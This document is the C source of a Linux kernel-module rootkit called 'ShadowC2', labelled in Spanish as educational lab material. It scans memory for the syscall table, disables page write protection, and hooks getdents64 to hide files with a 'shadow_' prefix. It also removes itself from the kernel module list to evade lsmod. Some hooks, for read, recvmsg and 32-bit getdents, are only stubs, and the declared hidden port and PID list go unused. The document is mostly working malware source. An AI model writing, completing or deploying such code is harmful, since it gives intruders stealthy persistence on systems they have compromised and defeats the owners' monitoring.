/**
 * ShadowC2 - Linux Rootkit (LKM)
 * Oculta archivos, procesos y conexiones
 * Laboratorio de Ciberseguridad - Uso Educativo
 * 
 * Compilación: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/inet_diag.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ShadowC2 Lab");
MODULE_DESCRIPTION("Educational Rootkit for Cybersecurity Training");
MODULE_VERSION("1.0");

#define MAGIC_PREFIX "shadow_"
#define HIDDEN_PORT 4444

// Syscall table pointer
static unsigned long **sys_call_table;

// Original syscalls
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_read)(const struct pt_regs *);
static asmlinkage long (*orig_recvmsg)(const struct pt_regs *);

// Hidden PIDs list
static int hidden_pids[32] = {0};
static int num_hidden_pids = 0;

// Module hiding
static struct list_head *prev_module;
static short hidden = 0;

/**
 * Hide the rootkit module from lsmod
 */
void hide_module(void) {
    if (!hidden) {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

/**
 * Show the rootkit module
 */
void show_module(void) {
    if (hidden) {
        list_add(&THIS_MODULE->list, prev_module);
        hidden = 0;
    }
}

/**
 * Check if filename should be hidden
 */
int should_hide_file(const char *name) {
    return strstr(name, MAGIC_PREFIX) != NULL;
}

/**
 * Check if PID should be hidden
 */
int should_hide_pid(int pid) {
    int i;
    for (i = 0; i < num_hidden_pids; i++) {
        if (hidden_pids[i] == pid) return 1;
    }
    return 0;
}

/**
 * Hooked getdents64 - hide files and directories
 */
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    unsigned long offset = 0;
    
    if (ret <= 0) return ret;
    
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent) return ret;
    
    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }
    
    while (offset < ret) {
        dir = (struct linux_dirent64 *)((char *)kdirent + offset);
        
        if (should_hide_file(dir->d_name)) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (char *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }
        
        offset += dir->d_reclen;
    }
    
    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);
    return ret;
}

/**
 * Hooked getdents - hide files (32-bit compatibility)
 */
asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    // Similar implementation for 32-bit
    return orig_getdents(regs);
}

/**
 * Hooked read - hide process info in /proc
 */
asmlinkage long hooked_read(const struct pt_regs *regs) {
    long ret = orig_read(regs);
    char __user *buf = (char __user *)regs->si;
    char *kbuf;
    
    if (ret <= 0) return ret;
    
    // Check if reading from /proc
    // Simplified - would need full path resolution
    
    return ret;
}

/**
 * Hooked recvmsg - hide network connections
 */
asmlinkage long hooked_recvmsg(const struct pt_regs *regs) {
    // Filter netlink messages to hide connections
    return orig_recvmsg(regs);
}

/**
 * Find syscall table
 */
static unsigned long **find_sys_call_table(void) {
    unsigned long offset;
    unsigned long **sct;
    
    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
        sct = (unsigned long **)offset;
        
        if (sct[__NR_close] == (unsigned long *)sys_close) {
            return sct;
        }
    }
    return NULL;
}

/**
 * Make page writable
 */
static void make_rw(void *addr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)addr, &level);
    if (pte) pte->pte |= _PAGE_RW;
}

/**
 * Make page read-only
 */
static void make_ro(void *addr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)addr, &level);
    if (pte) pte->pte &= ~_PAGE_RW;
}

/**
 * Module initialization
 */
static int __init rootkit_init(void) {
    printk(KERN_INFO "[ShadowC2] Rootkit loading...\n");
    
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "[ShadowC2] Syscall table not found\n");
        return -1;
    }
    
    // Save original syscalls
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_getdents = (void *)sys_call_table[__NR_getdents];
    orig_read = (void *)sys_call_table[__NR_read];
    orig_recvmsg = (void *)sys_call_table[__NR_recvmsg];
    
    // Hook syscalls
    make_rw(sys_call_table);
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    sys_call_table[__NR_getdents] = (unsigned long *)hooked_getdents;
    sys_call_table[__NR_read] = (unsigned long *)hooked_read;
    sys_call_table[__NR_recvmsg] = (unsigned long *)hooked_recvmsg;
    make_ro(sys_call_table);
    
    // Hide module
    hide_module();
    
    printk(KERN_INFO "[ShadowC2] Rootkit loaded and hidden\n");
    return 0;
}

/**
 * Module cleanup
 */
static void __exit rootkit_exit(void) {
    // Restore original syscalls
    make_rw(sys_call_table);
    sys_call_table[__NR_getdents64] = (unsigned long *)orig_getdents64;
    sys_call_table[__NR_getdents] = (unsigned long *)orig_getdents;
    sys_call_table[__NR_read] = (unsigned long *)orig_read;
    sys_call_table[__NR_recvmsg] = (unsigned long *)orig_recvmsg;
    make_ro(sys_call_table);
    
    // Show module before removal
    show_module();
    
    printk(KERN_INFO "[ShadowC2] Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
